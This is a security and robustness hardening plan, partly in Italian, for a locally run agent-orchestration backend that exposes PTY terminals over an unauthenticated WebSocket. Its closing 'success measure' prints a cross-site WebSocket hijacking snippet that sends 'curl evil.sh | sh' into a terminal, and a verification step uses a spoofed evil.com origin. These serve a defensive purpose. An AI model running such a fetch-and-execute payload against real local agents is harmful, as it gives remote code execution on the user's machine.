# Security & Robustness Hardening Plan

> **Status:** Phase 1 (P0 security + path validation) **implemented in v0.2.14**.
> Phase 2/3/4 are still open — see the checkboxes. Each item lists **what**,
> **how**, **why**, **risk if skipped**, **files touched**, and a **verification**
> step.
>
> **Threat model this plan assumes:** the backend runs locally (or on a LAN)
> for a single developer. The realistic attacker is **a web page the user
> visits while the backend is up** — a compromised site, a malicious ad, or a
> drive-by script — that opens a `WebSocket("ws://localhost:3847/ws")` from the
> browser and writes into a pi terminal that has the `bash` tool enabled. That
> is RCE from a web origin the user did not authorise. Secondary risks
> (filesystem enumeration, prompt/workflow tampering, fake handoffs) flow from
> the same gap: the backend trusts the local network and the browser's origin.
>
> Nothing here assumes multi-user, internet-exposed deployments. Those are
> explicitly out of scope (`ARCHITECTURE.md → Out of scope`).

## Current state (audit summary)

| Surface | Auth | Bind | Origin check | Notes |
|---------|------|------|--------------|-------|
| `/api/v1/orchestra/*` (REST) | ✅ `PINODES_ORCHESTRA_TOKEN` | — | — | `routes/orchestra.ts:6` `checkAuth` |
| `/ws` (WebSocket) | ❌ none | `0.0.0.0` | ❌ none | `index.ts:180`, `handler.ts:23` — **highest risk** |
| `/api/prompts`, `/api/workflows` | ❌ none | — | — | CRUD senza token |
| `/api/validate-path` | ❌ none | — | — | enumeration filesystem |
| `/internal/*` (call-agent, ready, handoff-failed, orchestra-context) | ❌ none | — | — | il pi-extension li chiama da localhost; ma qualsiasi client esterno può imitarli |
| CORS | `origin: true` (riflette tutto) | — | — | `index.ts:43` |

Le tre condizioni che rendono l'attacco realistico:
1. `app.listen({ host: "0.0.0.0" })` — reachable da qualsiasi interfaccia, localhost incluso.
2. `cors({ origin: true })` — fetch REST da qualsiasi origine.
3. WS senza né auth né check `Origin` — un sito apre il socket e scrive.

---

## Phase 0 — Modellazione minaccia e prerequisiti

### 0.1 Confermare il modello di minaccia con l'utente

- **What:** decidere se il backend può essere considerato "solo localhost, mai LAN".
- **Why:** cambia la surface. Se è solo localhost, bind `127.0.0.1` + check
  `Origin` risolvono il 90% senza token. Se serve LAN (VS Code remote,
  multibox, CI che pilota un backend remoto), serve il token anche sul WS.
- **Decisione di default:** supportare entrambi. `127.0.0.1` di default;
  opt-in per `0.0.0.0` via `PINODES_ORCHESTRA_HOST`. Token opzionale ma, se
  presente, applicato a **tutte** le superfici (non solo REST orchestra).

---

## Phase 1 — Chiudere il vettore browser→backend (priorità massima) — ✅ done in v0.2.14

Obiettivo: una pagina web arbitraria non deve poter aprire il WS né chiamare
REST. È la **P0 assoluta** perché è RCE di fatto via il tool `bash` di pi.

> **Implementation note (post-review fix):** the original 1.5 only covered the
> WS `load_graph` path. The SQLite rehydration path
> (`BoardManager` constructor → `ptyHub.setGraph` → `spawn`) still fell back
> silently to `process.cwd()` if a persisted board's `cwd` no longer existed,
> spawning pi in the wrong directory. Fixed by making `PtyHub.setGraph` the
> single `resolveCwd` choke point, removing the `fs.existsSync ? … : …` in
> `PtyHub.spawn`, and wrapping the `BoardManager` constructor rehydrate in a
> `try/catch` (via `resolveBoardCwd`) so an invalid board is skipped + logged
> instead of spawning pi in the backend's cwd.

### 1.1 Bind su `127.0.0.1` di default — ✅ implemented in v0.2.14

- **What:** cambiare `index.ts:196` da `host: "0.0.0.0"` a `host: "127.0.0.1"`.
  Aggiungere `PINODES_ORCHESTRA_HOST` (default `127.0.0.1`) per chi vuole LAN.
- **How:**
  ```ts
  const HOST = process.env.PINODES_ORCHESTRA_HOST ?? "127.0.0.1";
  await app.listen({ port: PORT, host: HOST });
  ```
- **Why:** `0.0.0.0` espone su tutte le interfacce: WiFi del bar, LAN di casa,
  qualsiasi rete a cui la macchina è connessa. `127.0.0.1` limita al loopback:
  solo processi locali possono connettersi. Non risolve da solo il vettore
  browser (il browser è locale), ma restringe la surface alla sola macchina.
- **Risk if skipped:** backend raggiungibile da altri device sulla rete (e.g.
  phone su stesso WiFi) senza auth.
- **Files:** `backend/src/index.ts`.
- **Verify:** `lsof -i :3847` mostra solo `127.0.0.1` dopo l'avvio.
- **Compat:** l'estensione VS Code usa già `127.0.0.1` (`backend.ts:58`), quindi
  nessun impatto. L'estensione che vuole parlare con un backend remoto imposta
  `PINODES_ORCHESTRA_HOST=0.0.0.0` esplicito (caso raro, documentato).

### 1.2 Check `Origin` sull'handshake WebSocket — ✅ implemented in v0.2.14

- **What:** in `attachWebSocket` (o via hook Fastify `preValidation` su `/ws`),
  leggere l'header `Origin` e reject se non corrisponde all'origine attesa.
- **How:**
  ```ts
  const ALLOWED_ORIGINS = new Set([
    "http://localhost:3847",
    "http://127.0.0.1:3847",
    // dev: il Vite server proxya al backend
    "http://localhost:5173",
    "http://127.0.0.1:5173",
  ]);
  // + PINODES_ORCHESTRA_ALLOWED_ORIGINS (CSV) per override
  // + se embedded host passa ?embed=vscode, accetta anche l'origin del webview
  ```
  Rifiutare con `socket.close(4001, "Origin not allowed")` prima di aggiungere
  ai `clients`.
- **Why:** il check `Origin` è il **meccanismo standard** del browser contro
  CSWSH (Cross-Site WebSocket Hijacking). I browser impostano `Origin` e
  **non** permettono alle pagine di spoofarlo. Un sito `evil.com` che apre
  `ws://localhost:3847` manda `Origin: http://evil.com` → reject.
- **Risk if skipped:**qualsiasi pagina visitata può aprire il WS e scrivere nei
  terminali pi (RCE via `bash`).
- **Files:** `backend/src/ws/handler.ts`, opz. `backend/src/index.ts` per
  registrare l'hook.
- **Verify:** da DevTools di una pagina su `example.com`:
  `new WebSocket("ws://localhost:3847/ws")` → close immediata con codice 4001.
  Dal proprio frontend → connect ok.
- **Edge cases:**
  - VS Code webview ha un `Origin` speciale (`vscode-webview://...`); accettarlo
    quando `?embed=vscode` è presente nella URL del WS (già passato dal panel).
  - Estensioni non-browser (CLI, `curl`) non mandano `Origin` → accettare se
    l'header è assente (CLI locali legittime) **ma**, se `PINODES_ORCHESTRA_TOKEN`
    è impostato, richiederlo anche per connessioni senza `Origin` (vedi 1.4).

### 1.3 Restringere CORS — ✅ implemented in v0.2.14

- **What:** sostituire `cors({ origin: true })` con `cors({ origin: ALLOWED_ORIGINS })`.
- **How:** stessa lista di 1.2. Aggiungere `PINODES_ORCHESTRA_ALLOWED_ORIGINS`
  per override. Supportare il caso embedded passando gli origin del webview.
- **Why:** `origin: true` riflette qualsiasi origin → fetch REST da `evil.com`
  passa. Con `origin: array` Fastify risponde `Access-Control-Allow-Origin`
  solo per le origini ammesse. Blocca `/api/validate-path`, `/api/prompts`,
  `/api/workflows` da siti non autorizzati anche prima di applicare auth.
- **Risk if skipped:** enumeration filesystem via `/api/validate-path` e
  modifica di prompt/workflow da qualsiasi sito.
- **Files:** `backend/src/index.ts:43`.
- **Verify:** `curl -H "Origin: http://evil.com" -I http://localhost:3847/api/prompts`
  → nessun `Access-Control-Allow-Origin: http://evil.com`. Da `localhost:5173`
  → presente.

### 1.4 Token applicato a tutte le superfici (se impostato) — ✅ implemented in v0.2.14

- **What:** se `PINODES_ORCHESTRA_TOKEN` è presente, richiederlo su **ogni**
  route e sul WS. Oggi solo `/api/v1/orchestra/*`.
- **How:**
  - **REST:** spostare `checkAuth` a un hook globale `preHandler` su `app`
    (non dentro `orchestraRoutes`). Escludere `/api/health` (liveness, serve
    all'estensione per il probe senza token). Escludere `/api/info` oppure
    richiedere token (l'estensione passa l'env, quindi ok richiederlo).
  - **WS:** durante l'handshake, leggere `?token=…` dalla URL del WS (i browser
    non permettono header custom su `new WebSocket`) **o** accettare un
    messaggio `{type:"auth", token}` come primo frame, chiudendo se non arriva
    entro N secondi. Preferire querystring (semplice, standard). Il frontend lo
    legge da `window.__PINODES_ORCHESTRA_TOKEN__` (iniettato dal panel VS Code)
    o da `localStorage` in standalone.
  - **`/internal/*`:** il pi-extension chiama da dentro un PTY, non conosce il
    token a meno di non passarlo via env allo spawn. Aggiungere
    `PINODES_ORCHESTRA_TOKEN` all'env del PTY in `PtyHub.spawn` (`index.ts:398`)
    così il `call-agent.ts` lo usa negli header (`authHeaders` esiste già).
- **Why:** un token che protegge solo metà delle route è teatro della
  sicurezza. Il WS è la route più pericolosa (RCE) ed è sguarnito.
- **Risk if skipped:** token inutile come protezione reale; finta sicurezza.
- **Files:** `backend/src/index.ts` (hook globale), `backend/src/ws/handler.ts`
  (handshake), `backend/src/pty/PtyHub.ts:398` (env del PTY),
  `backend/pi-extensions/call-agent.ts` (usa `authHeaders` ovunque, già parziale),
  `frontend/src/lib/api.ts` + `wsUrl` (append token se presente),
  `vscode-extension/src/panel.ts` (inietta `__PINODES_ORCHESTRA_TOKEN__`).
- **Verify:** con `PINODES_ORCHESTRA_TOKEN=test` avviato, `curl` senza header
  → 401 su tutte le route eccetto `/api/health`. WS senza `?token=` → close
  4002. Frontend ed estensione continuano a funzionare.

### 1.5 Rifiutare `cwd` inesistenti nel WS handler — ✅ implemented in v0.2.14

- **What:** `ws/handler.ts:54` fallbacka a `process.cwd()` silenziosamente se
  il `cwd` di `load_graph` non esiste. Allineare a `BoardManager.resolveCwd`
  che invece throwa.
- **How:** estrarre `resolveCwd` in `backend/src/utils/paths.ts` (la directory
  `utils/` è già presente ma vuota), usare sia in `handler.ts` sia in
  `BoardManager`. Opz. inviare un `error` WS al client invece di throware.
- **Why:** un `cwd` inesistente accettato in silenzio fa spawnare pi nella
  directory del backend (non voluta) e confonde l'utente ("perché pi lavora
  nel posto sbagliato?"). Coerenza con `BoardManager` + eliminazione di un
  comportamento sorprendente.
- **Risk if skipped:** comportamento incoerente, non security diretta.
- **Files:** `backend/src/utils/paths.ts` (nuovo), `backend/src/ws/handler.ts`,
  `backend/src/orchestra/BoardManager.ts`.
- **Verify:** `load_graph` con `cwd: "/non/esiste"` → WS `error` al client, no
  spawn silenzioso.

### 1.6 Gate `runFromHere` (frontend) via ready, non via `pty_input` diretto — ✅ implemented in v0.2.14

- **What:** `App.tsx:213` `runFromHere` fa `attach_node` + `pty_input` subito.
  Se il nodo non è spawnato o non è ready, il messaggio si perde o va in un PTY
  non inizializzato. Usare `inject_task` (ready-gated in `PtyHub`).
- **How:**
  ```ts
  const runFromHere = (nodeId: string, message: string) => {
    send({ type: "attach_node", nodeId });
    send({ type: "inject_task", nodeId, message });
  };
  ```
- **Why:** `inject_task` è gestito da `scheduleInject` che aspetta `markReady`.
  `pty_input` è raw keystrokes — niente gating. Elimina una race reale che
  l'utente sperimenta come "premo Run e non succede niente".
- **Risk if skipped:** race condizionale, non security. Ma inquina la UX.
- **Files:** `frontend/src/App.tsx:213`.
- **Verify:** con nodo non ancora spawnato, "Run from here" → messaggio
  appare dopo che pi ha booted, non prima.

---

## Phase 2 — Robustezza del protocollo e determinismo — ❌ open

### 2.1 Tipizzare il protocollo WS con discriminated union

- **What:** sostituire `WsClientMessage`/`WsServerMessage` (`types.ts:55-63`,
  `{type: string, [key: string]: unknown}`) con unioni discriminate per
  `type`, e un type guard `parseClientMessage(raw): WsClientMessage | {error}`.
- **How:**
  ```ts
  export type WsClientMessage =
    | { type: "load_graph"; boardId?: string; graph: WorkflowGraph; cwd?: string }
    | { type: "attach_node"; boardId?: string; nodeId: string; cols?: number; rows?: number; spawn?: boolean; resize?: boolean }
    | { type: "pty_input"; boardId?: string; nodeId: string; data: string }
    | { type: "pty_resize"; boardId?: string; nodeId: string; cols: number; rows: number }
    | { type: "inject_task"; boardId?: string; nodeId: string; message: string }
    | { type: "track_kanban"; boardId?: string }
    | { type: "set_enforcement"; boardId?: string; nodeId: string; enabled: boolean }
    | { type: "restart_node"; boardId?: string; nodeId: string; cols?: number; rows?: number }
    | { type: "abort_node"; boardId?: string; nodeId: string }
    | { type: "stop_board"; boardId?: string };
  ```
  `handler.ts` fa `switch (msg.type)` con narrowing automatico. Rimuovere i
  `msg.cols as number` sparsi.
- **Why:** oggi `handler.ts` fa `msg.cols as number || 80` — cast ciechi. Un
  payload malformato (client buggy o attaccante) produce comportamenti
  imprevedibili invece di un reject pulito. Tipizzare = narrowing + reject
  esplicito dei payload non validi.
- **Risk if skipped:** bug silenziosi su payload malformati, nessun reject.
- **Files:** `backend/src/types.ts`, `backend/src/ws/handler.ts`. Mirror type
  in `frontend/src/types.ts` per il lato client.
- **Verify:** `tsc` non ha `as` superflui in `handler.ts`; inviare
  `{type:"pty_resize", nodeId:"x"}` (manca cols) → `error` WS invece di
  `cols = NaN`.

### 2.2 Sostituire i timer magici del frontend con un ack `graph_synced`

- **What:** `App.tsx` usa `setTimeout(…, 1300)` (launchCard), `50ms`
  (addNodeFromPrompt), `400ms` (sync on board mount). Sostituire con un
  messaggio WS `graph_synced` dal backend dopo `setGraph`, e un store
  `lastGraphSync` in `runtimeStore`.
- **How:**
  - `PtyHub.setGraph` broadcasta `{type:"graph_synced", boardId, nodeIds: [...]}`.
  - `useOrchestraWs` lo scrive in `runtimeStore.graphSyncSeq[boardId]`.
  - `App.tsx` attende l'ack prima di `inject_task` (launchCard), invece di 1300ms.
- **Why:** timer magici sono fragili — su macchina lenta o board grossa, 1300ms
  non bastano e il task si perde; su macchina veloce è solo latenza inutile. Un
  ack esplicito rende il flusso deterministico.
- **Risk if skipped:** race intermittenti ("premo Start, non parte") su
  hardware lento.
- **Files:** `backend/src/pty/PtyHub.ts` (broadcast), `frontend/src/stores/runtimeStore.ts`,
  `frontend/src/hooks/useOrchestraWs.ts`, `frontend/src/App.tsx`.
- **Verify:** test e2e (manuale) su board con 10 nodi: Start Kanban → inject
  parte dopo ack, non dopo timer. Funziona anche su nodo "freddo".

### 2.3 Test per `ws/handler.ts`

- **What:** aggiungere `backend/src/ws/handler.test.ts`. Coprire:
  - `load_graph` con `cwd` valido → `setGraph` chiamato, enforcement overrides
    rispediti.
  - `load_graph` con `cwd` inesistente → `error` al client (dopo 1.5).
  - `attach_node` con `spawn:true, resize:false` → `ensure(...,true,false)`,
    replay con `cols/rows` dal `size`.
  - `attach_node` su nodo già ready → `node_ready` rispedito.
  - `set_enforcement` → broadcast `enforcement`.
  - Messaggio con `type` sconosciuto → `error`.
  - Payload malformato (dopo 2.1) → `error` con messaggio chiaro.
- **Why:** 149 righe di protocollo critico, zero test diretti. Ogni fix futuro
  su `handler.ts` rischia regressioni silenziose.
- **Risk if skipped:** regressioni non intercettate nel path più usato.
- **Files:** `backend/src/ws/handler.test.ts` (nuovo).
- **Verify:** `npm test -w backend` → nuovi test verdi.

---

## Phase 3 — Tooling e CI — ❌ open (recommended before Phase 2 refactor)

### 3.1 CI per test + typecheck + build

- **What:** nuovo workflow `.github/workflows/ci.yml` che su ogni push/PR:
  - `npm ci`
  - `npm test --workspaces --if-present`
  - `npm run build` (backend + frontend)
  - opz. `npx tsc --noEmit -p vscode-extension` (l'estensione non ha test)
- **Why:** oggi solo `publish-extension.yml` (build VSIX su tag). Nessun gate
  su PR. Un commit che rompe test o tipi passa inosservato fino al release.
- **Risk if skipped:** regressioni su main, scoperte tardivamente.
- **Files:** `.github/workflows/ci.yml` (nuovo).
- **Verify:** aprire PR che rompe un test → CI red. PR pulita → green.

### 3.2 Lint + format (biome o eslint+prettier)

- **What:** aggiungere biome (più leggero, zero config) o eslint+prettier.
  Rimuovere l'`eslint-disable` orphan in `FlowCanvas.tsx:94` (eslint non è
  installato). Aggiungere `npm run lint` e `npm run format` ai workspace.
- **Why:** consistenza di stile, catch di bug banali (`===` vs `==`, unused
  vars, `any` implicitti). L'`eslint-disable` orphan è segnale che il lint
  esisteva ed è stato rimosso senza pulire.
- **Risk if skipped:** drift di stile, niente bloccante.
- **Files:** `package.json` (root), `biome.json` o `.eslintrc`, `backend/package.json`,
  `frontend/package.json` (script).
- **Verify:** `npm run lint` → 0 errori. CI lo gira.

### 3.3 Aggiornare AGENTS.md con i comandi di verifica

- **What:** in `AGENTS.md` (o `CLAUDE.md`) aggiungere sezione "Verify":
  - `npm test --workspaces` — test suite
  - `npm run build` — typecheck + build
  - `npm run lint` (dopo 3.2)
- **Why:** gli agent (opencode, Claude) sanno quale comando lanciare per
  verificare il lavoro senza doverlo indovinare. Oggi `AGENTS.md` parla solo di
  GitNexus, non dei comandi di verifica del repo.
- **Risk if skipped:** nessuno, igiene.
- **Files:** `AGENTS.md`.
- **Verify:** sezione presente e corretta.

---

## Phase 4 — Osservabilità e performance (dopo P1–P3) — ❌ open

### 4.1 Handoff log / timeline panel

- **What:** nuovo pannello che mostra lo stream di handoff `from → to` con
  timestamp, messaggio, esito (delivered / failed / retried). `handoff-failed`
  (già tracciato come `node_status: error`) converge qui.
- **How:**
  - `PtyHub.deliverCall` broadcasta `{type:"handoff_event", boardId, from, to, status, message}`.
  - `runtimeStore.handoffLog[boardId]` accumula.
  - Nuovo componente `HandoffTimeline.tsx` (sidebar o tab).
- **Why:** su pipeline di 5+ nodi, debuggare "perché l'architect non ha
  passato al dev" richiede di scavare nei terminali. Un timeline rende visibile
  il flusso — allineato alla thesis "visible handoffs" del progetto.
- **Risk if skipped:** debug manuale difficoltoso, già listato in "out of scope"
  ma è la feature di osservabilità mancante più sentita.
- **Files:** `backend/src/pty/PtyHub.ts`, `frontend/src/stores/runtimeStore.ts`,
  `frontend/src/components/HandoffTimeline.tsx` (nuovo), `frontend/src/App.tsx`.
- **Verify:** handoff tra 2 nodi → entry nel timeline. Handoff fallito → entry
  rossa.

### 4.2 Lazy-spawn dei nodi non-entry

- **What:** oggi ogni card spawna pi al load del board (`NodeTerminal` con
  `spawn:true`). Su board con N nodi = N processi pi pesanti. Cambiare in:
  spawn eager solo l'entry node; gli altri spawnano al primo `attach`
  interattivo (side panel o expand).
- **How:**
  - `NodeTerminal` passa `spawn: false` se il nodo non è entry.
  - L'entry node mantiene `spawn: true` (così "Run" parte subito).
  - Side panel / overlay: `attach_node` con `spawn: true` (già così).
- **Why:** board da 10 nodi = 10 processi pi + 10 connessioni LLM solo per
  mostrarli. Lazy = 1 processo (entry) finché l'utente non interagisce.
- **Risk if skipped:** overhead pesante su board grandi, possibile costo LLM
  se pi boot fatto subito girare.
- **Files:** `frontend/src/components/NodeTerminal.tsx:89`, `frontend/src/components/FlowCanvas.tsx`
  (passa `isEntry` al `NodeTerminal`).
- **Verify:** board con 5 nodi, solo entry ha PTY attivo dopo load. Click su
  altro nodo → spawn al momento dell'attach.

### 4.3 Run history / analytics (out of scope v1, ma pianificato)

- **What:** tabella SQLite `runs` con board, entry node, messaggio, start/end,
  esito, # handoff, # retry watchdog. UI "History" con replay minimale.
- **Why:** retrospettiva su handoff falliti, retry del watchdog, durata media.
  Non bloccante per il core.
- **Risk if skipped:** niente, è enhancement.
- **Files:** `backend/src/db/index.ts` (schema + CRUD), `backend/src/orchestra/BoardManager.ts`
  (hook su `run`), `frontend/src/components/HistoryPanel.tsx` (nuovo).
- **Verify:** un flow completato → riga in `runs`; UI la mostra.

---

## Sequenza di implementazione consigliata

```
Phase 1.1  bind 127.0.0.1            [~10 min, no compat break]
Phase 1.3  CORS lockdown             [~15 min]
Phase 1.2  WS Origin check           [~30 min, edge case VS Code webview]
Phase 1.5  reject cwd inesistente    [~20 min, +utils/paths.ts]
Phase 1.6  runFromHere via inject    [~5 min]
Phase 2.1  tipi WS discriminated     [~45 min, refactor handler]
Phase 1.4  token su tutte le surface [~1h, tocca backend+frontend+ext+pi-ext]
Phase 3.1  CI ci.yml                 [~20 min]
Phase 2.3  test ws/handler           [~45 min]
Phase 2.2  ack graph_synced          [~40 min, frontend+backend]
Phase 3.2  lint                      [~30 min]
Phase 3.3  AGENTS.md verify section  [~5 min]
─── P0/P1 completa, deploy sicuro ───
Phase 4.1  handoff timeline          [~1.5h]
Phase 4.2  lazy-spawn                [~30 min]
Phase 4.3  run history               [~3h, DB migration]
```

**Totale P0–P3:** ~5–6 ore di lavoro effettivo. Dopo P1 il vettore
browser→RCE è chiuso. Dopo P3 la CI copre regressioni.

## Cosa NON fare

- **Non** aggiungere auth utenti/RBAC: out of scope, progetto single-user.
- **Non** passare a HTTPS/WSS locale: il backend è localhost, certificati
  sarebbero un problema superiore al rischio. Origin check + bind loopback
  bastano.
- **Non** cifrare il token in DB: è un shared secret env-based, non credenziale
  utente. HSM/vault è overkill.
- **Non** rate-limitare il WS: single-user locale, non c'è caso d'uso.

## Misura di successo

Dopo Phase 1, questo scenario **non** funziona più:
```js
// da DevTools di example.com col backend su
const ws = new WebSocket("ws://localhost:3847/ws");
ws.onopen = () => ws.send(JSON.stringify({
  type: "pty_input", nodeId: "<qualsiasi>",
  data: "curl evil.sh | sh\r",
}));
```
- Senza `?token=` → close 4002 (se token impostato).
- Con `Origin: http://example.com` → close 4001.
- Se `0.0.0.0` disattivato → non raggiungibile da altre macchine.

È la garanzia minima per poter tenere il backend acceso mentre navighi.
